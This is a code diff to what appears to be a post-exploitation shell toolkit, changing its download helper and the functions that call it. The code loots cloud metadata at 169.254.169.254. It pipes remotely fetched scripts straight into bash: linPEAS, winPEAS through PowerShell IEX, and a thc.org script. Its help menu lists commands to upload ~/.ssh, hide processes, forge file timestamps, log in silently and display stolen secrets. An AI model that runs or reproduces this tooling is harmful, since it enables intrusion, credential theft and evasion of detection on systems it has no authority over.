@@ -508,7 +508,7 @@ _loot_openstack() {
     [ -n "$_HS_NOT_OPENSTACK" ] && return
     [ -n "$_HS_NO_SSRF_169" ] && return
 
-    str="$(timeout 4 "${DL[@]}" "http://169.254.169.254/openstack/latest/user_data" 2>/dev/null)" || {
+    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
         [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
         unset str
     }
@@ -519,7 +519,7 @@ _loot_openstack() {
     echo -e "${CB}OpenStack user_data${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
-    echo -e "${CW}TIP: ${CDC}"'"${DL[@]}" "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
+    echo -e "${CW}TIP: ${CDC}"'dl "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
 }
 
 # FIXME: Search through environment variables of all running processes.
@@ -681,71 +681,15 @@ loot() {
 # https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 # https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
 lpe() {
-    echo -e "${CB}Determining operating system...${CN}"
-
     # Detect the OS
     OS="$(uname -s)"
     case "$OS" in
-        Linux)
-            echo -e "${CB}Linux detected. Running linPEAS...${CN}"
-            # Try to use curl first
-            if command -v curl >/dev/null 2>&1; then
-                echo -e "${CB}Using curl to download and execute linPEAS...${CN}"
-                curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
-            elif command -v python >/dev/null 2>&1; then
-                echo -e "${CB}Using python to download and execute linPEAS...${CN}"
-                python -c "
-import urllib.request
-import subprocess
-url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
-script_content = urllib.request.urlopen(url).read().decode('utf-8')
-subprocess.run(['bash'], input=script_content.encode('utf-8'))
-                "
-            elif command -v python3 >/dev/null 2>&1; then
-                echo -e "${CB}Using python3 to download and execute linPEAS...${CN}"
-                python3 -c "
-import urllib.request
-import subprocess
-url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
-script_content = urllib.request.urlopen(url).read().decode('utf-8')
-subprocess.run(['bash'], input=script_content.encode('utf-8'))
-                "
-            else
-                echo -e "${CR}Error: Neither curl nor python/python3 is available to download and execute linPEAS.${CN}"
-                return 1
-            fi
-            ;;
-        Darwin)
-            echo -e "${CB}macOS detected. Running linPEAS...${CN}"
-            # macOS is Unix-based, so it can use linPEAS like Linux
-            if command -v curl >/dev/null 2>&1; then
-                echo -e "${CB}Using curl to download and execute linPEAS...${CN}"
-                curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
-            elif command -v python >/dev/null 2>&1; then
-                echo -e "${CB}Using python to download and execute linPEAS...${CN}"
-                python -c "
-import urllib.request
-import subprocess
-url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
-script_content = urllib.request.urlopen(url).read().decode('utf-8')
-subprocess.run(['bash'], input=script_content.encode('utf-8'))
-                "
-            elif command -v python3 >/dev/null 2>&1; then
-                echo -e "${CB}Using python3 to download and execute linPEAS...${CN}"
-                python3 -c "
-import urllib.request
-import subprocess
-url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
-script_content = urllib.request.urlopen(url).read().decode('utf-8')
-subprocess.run(['bash'], input=script_content.encode('utf-8'))
-                "
-            else
-                echo -e "${CR}Error: Neither curl nor python/python3 is available to download and execute linPEAS.${CN}"
-                return 1
-            fi
+        Linux|Darwin)
+            echo -e "${CB}Running linPEAS...${CN}"
+            dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
             ;;
         CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
-            echo -e "${CB}Windows detected. Running winPEAS...${CN}"
+            echo -e "${CB}Running winPEAS...${CN}"
             if command -v powershell >/dev/null 2>&1; then
                 echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
                 powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
@@ -760,7 +704,6 @@ subprocess.run(['bash'], input=script_content.encode('utf-8'))
             ;;
     esac
 }
-
 
 ws() {
     dl https://thc.org/ws | bash
@@ -857,7 +800,6 @@ hs_init_dl() {
             [ -n "$UNSAFE" ] && opts=("-k")
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
         }
-        DL=("curl" "-fsSL" "${opts[@]}" "--connect-timeout" "7" "--retry" "3")
     elif command -v wget >/dev/null; then
         _HS_SSL_ERR="is not trusted"
         dl() {
@@ -866,10 +808,20 @@ hs_init_dl() {
             # Can not use '-q' here because that also silences SSL/Cert errors
             wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
         }
-        DL=("wget" "-q" "-O-" "${opts[@]}" "--connect-timeout=7" "--dns-timeout=7")
+    elif [ -n "$HS_PY" ]; then
+        dl() {
+            local opts="timeout=10"
+            local opts_init
+            local url
+            [ -n "$UNSAFE" ] && {
+                opts_init="import ssl;ctx = ssl.create_default_context();ctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;"
+                opts+=", context=ctx"
+            }
+            url="'${1:?}'"
+            "$HS_PY" -c "import urllib.request;${opts_init}print(urllib.request.urlopen($url, $opts).read().decode('utf-8'))"
+        }
     else
-        dl() { HS_ERR "Not found: curl, wget"; }
-        DL=("false")
+        dl() { HS_ERR "Not found: curl, wget, python"; }
     fi
 }
 
@@ -1013,6 +965,7 @@ ${CDC} xssh                                  ${CDM}Silently log in to remote hos
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
+${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
@@ -1028,15 +981,13 @@ ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP
 ${CDC} hide <pid>                            ${CDM}Hide a process
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
+${CDC} lpe                                   ${CDM}Run linPEAS
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
-${CDC} lpe                                   ${CDM}Find LPE on this system
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
 }
-
-
 
 ### Programm
 hs_init "$0"
